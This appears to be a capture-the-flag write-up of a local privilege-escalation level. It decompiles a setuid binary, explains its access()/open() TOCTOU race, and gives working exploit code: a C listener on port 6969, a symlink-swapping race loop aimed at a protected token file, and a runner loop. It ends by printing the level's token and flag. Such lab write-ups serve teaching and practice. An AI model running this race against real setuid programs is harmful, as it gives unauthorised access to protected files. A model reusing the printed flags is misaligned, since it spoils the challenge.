What do we have?

	$ ll
	total 28
	dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
	d--x--x--x  1 root    users     340 Aug 30  2015 ../
	-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
	-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
	-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
	-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
	-rw-------  1 flag10  flag10     26 Mar  5  2016 token

Again, a binary `level10`, with the rights to launch as owner, and a `token` file.

`Ghidra`:

	/* WARNING: Unknown calling convention */

	int main(int argc,char **argv)

	{
	char *__cp;
	uint16_t uVar1;
	int iVar2;
	int iVar3;
	ssize_t sVar4;
	size_t __n;
	int *piVar5;
	char *pcVar6;
	int in_GS_OFFSET;
	undefined4 *in_stack_00000008;
	char *file;
	char *host;
	int fd;
	int ffd;
	int rc;
	char buffer [4096];
	sockaddr_in sin;
	undefined1 local_1024 [4096];
	sockaddr local_24;
	int local_14;
	
	local_14 = *(int *)(in_GS_OFFSET + 0x14);
	if (argc < 3) {
		printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
						/* WARNING: Subroutine does not return */
		exit(1);
	}
	pcVar6 = (char *)in_stack_00000008[1];
	__cp = (char *)in_stack_00000008[2];
	iVar2 = access((char *)in_stack_00000008[1],4);
	if (iVar2 == 0) {
		printf("Connecting to %s:6969 .. ",__cp);
		fflush(stdout);
		iVar2 = socket(2,1,0);
		local_24.sa_data[2] = '\0';
		local_24.sa_data[3] = '\0';
		local_24.sa_data[4] = '\0';
		local_24.sa_data[5] = '\0';
		local_24.sa_data[6] = '\0';
		local_24.sa_data[7] = '\0';
		local_24.sa_data[8] = '\0';
		local_24.sa_data[9] = '\0';
		local_24.sa_data[10] = '\0';
		local_24.sa_data[0xb] = '\0';
		local_24.sa_data[0xc] = '\0';
		local_24.sa_data[0xd] = '\0';
		local_24.sa_family = 2;
		local_24.sa_data[0] = '\0';
		local_24.sa_data[1] = '\0';
		local_24.sa_data._2_4_ = inet_addr(__cp);
		uVar1 = htons(0x1b39);
		local_24.sa_data._0_2_ = uVar1;
		iVar3 = connect(iVar2,&local_24,0x10);
		if (iVar3 == -1) {
		printf("Unable to connect to host %s\n",__cp);
						/* WARNING: Subroutine does not return */
		exit(1);
		}
		sVar4 = write(iVar2,".*( )*.\n",8);
		if (sVar4 == -1) {
		printf("Unable to write banner to host %s\n",__cp);
						/* WARNING: Subroutine does not return */
		exit(1);
		}
		printf("Connected!\nSending file .. ");
		fflush(stdout);
		iVar3 = open(pcVar6,0);
		if (iVar3 == -1) {
		puts("Damn. Unable to open file");
						/* WARNING: Subroutine does not return */
		exit(1);
		}
		__n = read(iVar3,local_1024,0x1000);
		if (__n == 0xffffffff) {
		piVar5 = __errno_location();
		pcVar6 = strerror(*piVar5);
		printf("Unable to read from file: %s\n",pcVar6);
						/* WARNING: Subroutine does not return */
		exit(1);
		}
		write(iVar2,local_1024,__n);
		iVar2 = puts("wrote file!");
	}
	else {
		iVar2 = printf("You don\'t have access to %s\n",pcVar6);
	}
	if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
						/* WARNING: Subroutine does not return */
		__stack_chk_fail();
	}
	return iVar2;
	}

Seems like the program do an `access` on the file given as an argument, and if the rights to read is there, connect to a server on port `6969`, open the file, and write its content. That's a typical `TOCTOU race condition`.

From the man of access: 

	Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so  using  open(2)
	creates  a security hole, because the user might exploit the short time interval between checking and opening the file to manipu‐
	late it.  For this reason, the use of this system call should be avoided.  (In the example just described,  a  safer  alternative
	would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)

Wikipedia of TOCTOU:

	|--------------------------------------------------------|-------------------------------------------------------|
	| Victim                                                 | Attacker                                              |
	|--------------------------------------------------------|-------------------------------------------------------|
	| if (access("file", W_OK) != 0) {                       |                                                       |
	| exit(1);                                               |                                                       |
	| }                                                      |                                                       |
	|--------------------------------------------------------|-------------------------------------------------------|
	|                                                        | After the access check, before the open, the attacker |
	|                                                        | replaces file with a symlink to the Unix password     |
	|                                                        | file /etc/passwd:                                     |
	|                                                        | symlink("/etc/passwd", "file");                       |
	|--------------------------------------------------------|-------------------------------------------------------|
	| fd = open("file", O_WRONLY);                           |                                                       |
	| write(fd, buffer, sizeof(buffer));                     |                                                       |
	|--------------------------------------------------------|-------------------------------------------------------|

We need a server using port 6969, but `netstat` state that there is none.

	$ netstat -tuln
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State      
	tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN     
	tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN     
	tcp6       0      0 :::4646                 :::*                    LISTEN     
	tcp6       0      0 :::4747                 :::*                    LISTEN     
	tcp6       0      0 :::80                   :::*                    LISTEN     
	tcp6       0      0 :::4242                 :::*                    LISTEN     
	udp        0      0 0.0.0.0:68              0.0.0.0:*

So, we need to create:
- A server creating a socket on `port 6969`, and writing the inputs it gets.
- A script that will use the exploit of `access` in a while loop, as it likely won't work on first try.
- A script that will run the binary in a while loop, as it likely won't work on the first try.

`nano /tmp/s.c; cd /tmp; cc /tmp/s.c; /tmp/a.out`:

	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <string.h>
	#include <netinet/in.h>

	int main(void)
	{
		char buffer[1024];
		ssize_t byte;

		struct sockaddr_in addr = {0};
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = INADDR_ANY;
		addr.sin_port = htons(6969);
		int sock = socket(AF_INET, SOCK_STREAM, 0);

		if (sock < 0)
			return (1);
		if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		{
			perror("bind");
			return (1);
		}
		if (listen(sock, 1) < 0)
			return (1);
		while (1)
		{
			int client = accept(sock, NULL, NULL);
			if (client < 0)
				continue;
			while ((byte = read(client, buffer, 1023)) > 0)
			{
				buffer[byte] = '\0';
				if (buffer[0] != '\0' && buffer[0] != '.')
					printf("%s\n", buffer);
			}
			close(client);
		}
		close(sock);
		return (0);
	}

`nano /tmp/sr.sh; chmod 777 /tmp/sr.sh; /tmp/sr.sh`:

	#!/bin/bash
	while true
	do
		touch /tmp/e
		rm -rf /tmp/e
		ln -s /home/user/level10/token /tmp/e
		rm -rf /tmp/e
	done

`nano /tmp/r.sh; chmod 777 /tmp/r.sh; /tmp/r.sh`:

	#!/bin/bash
	while true
	do
		/home/user/level10/level10 /tmp/e 127.0.0.1
	done

The server will get `woupa2yuojeeaaed06riuj63c`, that we'll use for `flag10`.

	$ su flag10
	Password: 
	Don't forget to launch getflag !
	$ getflag
	Check flag.Here is your token : feulo4b72j7edeahuete3no7c
